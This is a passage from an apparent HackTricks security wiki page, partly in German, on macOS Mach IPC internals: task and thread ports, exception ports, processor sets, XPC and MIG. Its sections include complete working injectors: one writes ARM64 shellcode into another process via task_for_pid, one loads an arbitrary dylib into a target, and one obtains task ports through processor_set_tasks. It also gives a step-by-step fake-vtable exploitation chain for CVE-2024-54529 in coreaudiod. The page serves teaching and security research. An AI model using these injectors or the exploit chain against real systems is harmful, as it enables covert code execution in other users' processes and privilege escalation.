- `task_threads`: SEND-Recht für alle Task-Ports der Threads des Tasks erhalten
- `task_info`: Informationen über einen Task abrufen
- `task_suspend/resume`: Einen Task anhalten oder fortsetzen
- `task_[get/set]_special_port`
- `thread_create`: Einen Thread erstellen
- `task_[get/set]_state`: Den Zustand eines Tasks steuern
- und mehr in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Beachte, dass mit einem SEND-Recht auf einen Task-Port eines **anderen Tasks** solche Aktionen für einen anderen Task ausgeführt werden können.

Darüber hinaus ist der Task-Port auch der **`vm_map`**-Port, der es einem Aufrufer ermöglicht, den **Speicher innerhalb eines Tasks zu lesen und zu manipulieren**, und zwar mit Funktionen wie `vm_read()` und `vm_write()`. Das bedeutet, dass ein Task mit SEND-Rechten auf den Task-Port eines anderen Tasks **Code in diesen Task injizieren** kann.

Denke daran: Da der **Kernel ebenfalls ein Task** ist, kann jemand, der **SEND-Berechtigungen** für den **`kernel_task`** erlangt, den Kernel dazu bringen, beliebigen Code auszuführen (jailbreaks).

- Rufe `mach_task_self()` auf, um den **Namen** dieses Ports für den aufrufenden Task **zu erhalten**. Dieser Port wird nur über **`exec()`** vererbt; ein mit `fork()` erstellter neuer Task erhält einen neuen Task-Port (als Sonderfall erhält ein Task nach `exec()`in einem suid-Binary ebenfalls einen neuen Task-Port). Die einzige Möglichkeit, einen Task zu starten und seinen Port zu erhalten, besteht darin, während eines `fork()` den [„port swap dance“](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) auszuführen.
- Dies sind die Einschränkungen für den Zugriff auf den Port (aus `macos_task_policy` im Binary `AppleMobileFileIntegrity`):
- Wenn die App über das **`com.apple.security.get-task-allow`-Entitlement** verfügt, können Prozesse desselben **Benutzers auf den Task-Port zugreifen** (wird häufig von Xcode für das Debugging hinzugefügt). Der **Notarisierungsprozess** erlaubt dies bei Produktions-Releases nicht.
- Apps mit dem **`com.apple.system-task-ports`-Entitlement** können den **Task-Port jedes** Prozesses erhalten, außer dem Kernel. In älteren Versionen hieß es **`task_for_pid-allow`**. Dieses Entitlement wird nur Apple-Anwendungen gewährt.
- **Root kann auf Task-Ports** von Anwendungen zugreifen, die nicht mit einer **gehärteten** Runtime kompiliert wurden (und nicht von Apple stammen).

**Der Task-Name-Port:** Eine nicht privilegierte Version des _Task-Ports_. Er verweist auf den Task, erlaubt jedoch nicht, ihn zu steuern. Das Einzige, was darüber verfügbar zu sein scheint, ist `task_info()`.

### Thread-Ports

Threads besitzen ebenfalls zugeordnete Ports, die vom Task aus sichtbar sind, der **`task_threads`** aufruft, sowie vom Prozessor über `processor_set_threads`. Ein SEND-Recht auf den Thread-Port ermöglicht die Verwendung der Funktionen aus dem `thread_act`-Subsystem, zum Beispiel:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Jeder Thread kann diesen Port durch den Aufruf von **`mach_thread_sef`** erhalten.

### Shellcode-Injection in einen Thread über den Task-Port

Du kannst Shellcode abrufen von:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompiliere** das vorherige Programm und füge die **Entitlements** hinzu, um Code mit demselben Benutzer injizieren zu können (andernfalls musst du **sudo** verwenden).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Damit dies unter iOS funktioniert, benötigen Sie das Entitlement `dynamic-codesigning`, damit Sie beschreibbaren Speicher ausführbar machen können.

### Dylib Injection in thread via Task port

In macOS können **threads** über **Mach** oder mithilfe der POSIX-API `pthread` manipuliert werden. Der **thread**, den wir bei der vorherigen Injection erzeugt haben, wurde mithilfe der Mach-API erstellt und ist daher **nicht POSIX-konform**.

Es war möglich, **ein einfaches Shellcode** zu **injizieren**, um einen Befehl auszuführen, da dieser **nicht mit POSIX**-konformen APIs funktionieren musste, sondern nur mit Mach. **Komplexere Injections** würden erfordern, dass der **thread** ebenfalls **POSIX-konform** ist.

Um den **thread zu verbessern**, sollte er daher **`pthread_create_from_mach_thread`** aufrufen, wodurch ein **gültiger pthread** erstellt wird. Dieser neue pthread könnte anschließend **dlopen** aufrufen, um eine **dylib** aus dem System zu **laden**. Anstatt also neuen Shellcode zu schreiben, um verschiedene Aktionen auszuführen, ist es möglich, eigene Libraries zu laden.<sup>[[2]](#references)</sup>

Sie finden **Beispiel-dylibs** unter (zum Beispiel eine, die einen Logeintrag erzeugt, den Sie anschließend abhören können):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bei dieser Technik wird ein Thread des Prozesses hijacked:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Erkennung von Task Port Injection

Beim Aufruf von `task_for_pid` oder `thread_create_*` wird ein Zähler in der `task`-Struktur des Kernels erhöht, auf den aus dem User Mode durch den Aufruf von `task_info(task, TASK_EXTMOD_INFO, ...)` zugegriffen werden kann.

## Exception Ports

Wenn in einem Thread eine Exception auftritt, wird diese Exception an den designated Exception Port des Threads gesendet. Wenn der Thread sie nicht behandelt, wird sie an die Exception Ports des Tasks gesendet. Wenn der Task sie nicht behandelt, wird sie an den Host Port gesendet, der von launchd verwaltet wird, wo sie bestätigt wird. Dies wird als Exception Triage bezeichnet.

Beachte, dass der Report am Ende normalerweise vom ReportCrash-Daemon behandelt wird, wenn er nicht ordnungsgemäß behandelt wurde. Es ist jedoch möglich, dass ein anderer Thread innerhalb desselben Tasks die Exception verwaltet. Genau das tun Crash-Reporting-Tools wie `PLCreashReporter`.

## Andere Objekte

### Clock

Jeder User kann auf Informationen über die Clock zugreifen. Um jedoch die Zeit einzustellen oder andere Einstellungen zu ändern, muss man root sein.

Um Informationen abzurufen, können Funktionen aus dem `clock`-Subsystem aufgerufen werden, wie etwa: `clock_get_time`, `clock_get_attributtes` oder `clock_alarm`\
Um Werte zu ändern, kann das `clock_priv`-Subsystem mit Funktionen wie `clock_set_time` und `clock_set_attributes` verwendet werden.

### Processors and Processor Set

Die Processor-APIs ermöglichen die Steuerung eines einzelnen logischen Prozessors durch Funktionen wie `processor_start`, `processor_exit`, `processor_info` und `processor_get_assignment`.

Außerdem bieten die APIs des **processor set** eine Möglichkeit, mehrere Prozessoren zu einer Gruppe zusammenzufassen. Das standardmäßige Processor Set kann durch Aufruf von **`processor_set_default`** abgerufen werden.\
Dies sind einige interessante APIs zur Interaktion mit dem Processor Set:

- `processor_set_statistics`
- `processor_set_tasks`: Gibt ein Array von Send Rights für alle Tasks innerhalb des Processor Sets zurück
- `processor_set_threads`: Gibt ein Array von Send Rights für alle Threads innerhalb des Processor Sets zurück
- `processor_set_stack_usage`
- `processor_set_info`

Wie in [**diesem Beitrag**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) erwähnt, konnte dies in der Vergangenheit genutzt werden, um den zuvor erwähnten Schutz zu umgehen, Task Ports in anderen Prozessen zu erhalten und diese durch den Aufruf von **`processor_set_tasks`** zu steuern, wodurch ein Host Port für jeden Prozess erhalten wurde.<sup>[[10]](#references)</sup>\
Heutzutage benötigt man root, um diese Funktion zu verwenden. Außerdem ist sie geschützt, sodass du diese Ports nur für ungeschützte Prozesse erhalten kannst.<sup>[[10]](#references)</sup>

Du kannst es mit folgendem Code ausprobieren:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirekter Aufruf über vtable-Slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
